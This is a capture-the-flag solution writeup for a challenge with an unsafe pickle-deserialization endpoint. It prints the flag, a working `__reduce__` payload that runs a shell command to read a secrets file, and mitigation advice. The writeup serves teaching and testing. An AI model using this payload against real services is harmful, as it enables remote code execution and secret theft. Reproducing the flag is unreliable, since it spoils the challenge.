# Solution Writeup — DataForge Registry

Flag: `FLAG{y0u_r3cru1t3d_th3_s3nt1n3l_1ts3lf}`

## Step 1 — Recon: the exposed cache

Visiting `/cache/` shows a plain directory listing (the kind a
misconfigured static file server or artifact cache produces). The
directory *names* read like a conversation between two other actors who
already found their way in:

```
0001_req_ping_is_anyone_watching_this_cache
0002_resp_negative_scanners_check_files_not_dirs
0003_req_found_unauth_endpoint_slash_datasets_slash_process
0004_resp_confirm_it_accepts_arbitrary_pickle_files
0005_req_pickle_load_executes_on_deserialize_no_validation
0006_resp_ack_proceeding_to_exploit_phase
0007_req_after_exec_check_secrets_dir_for_admin_token
0008_resp_copy_that_good_hunting
```

Two things are being handed to the player here: the vulnerable endpoint
(`/datasets/process`), and what's wrong with it (unsafe `pickle.load`),
plus where to look once you have code execution (`secrets/`).

## Step 2 — Exploiting insecure deserialization

`/datasets/process` accepts a file upload and runs it through
`pickle.loads()` with no validation:

```python
result = pickle.loads(data)
return jsonify({"status": "processed", "result": str(result)})
```

Python's pickle format isn't just a data format — it can encode
instructions to call arbitrary functions during reconstruction, via the
`__reduce__` protocol. Any class that defines `__reduce__` to return
`(callable, args_tuple)` will have `callable(*args_tuple)` invoked the
moment the pickle is loaded, and *that return value* becomes the
"deserialized object."

Since the app echoes `str(result)` straight back in the response, the
attacker doesn't even need blind RCE — they get the output of their
command reflected directly:

```python
import pickle, subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.getoutput, ("cat secrets/cluster_admin_flag.txt",))

payload = pickle.dumps(Exploit())
```

Upload `payload` as the `dataset` file to `/datasets/process`, and the
JSON response's `"result"` field contains the flag.

## Step 3 — Automated solve

```
pip install requests
python3 solve.py http://localhost:5000        # or the deployed URL
```

`solve.py` crafts the payload above, uploads it, and prints the
recovered flag.

## Why this matters (talking point for players)

`pickle` is not a safe format for untrusted input — the Python docs say
so explicitly. If you need to accept structured data from outside your
trust boundary, use a format with no code-execution semantics (JSON,
protobuf, msgpack) or, if you must use pickle, restrict what it's
allowed to reconstruct (e.g. a custom `Unpickler.find_class` allowlist)
and never expose the endpoint without authentication in the first
place. The exposed `/cache/` listing was itself a real bug independent
of the RCE — information disclosure that told an attacker exactly where
to look.

## Design notes (for whoever maintains this challenge)

- Change the flag by editing `secrets/cluster_admin_flag.txt` before
  building/deploying.
- The narrative directory names in `cache/` are cosmetic — feel free to
  rewrite them for a different framing (they're just empty directories,
  read via `os.listdir` in `app.py`'s `/cache/` route).
- `ACCESS_CODE` (see README's "Hosting this publicly") is the gate to
  set before this ever touches a public network — without it, the RCE
  endpoint is reachable by anyone who finds the URL, not just your
  players.
- Harder variant idea: require the player to first exfiltrate a
  credential via the RCE, then use it against a *second*, authenticated
  endpoint — mirrors the real incident's move from initial code
  execution to full cluster-admin more closely than a single flag file.
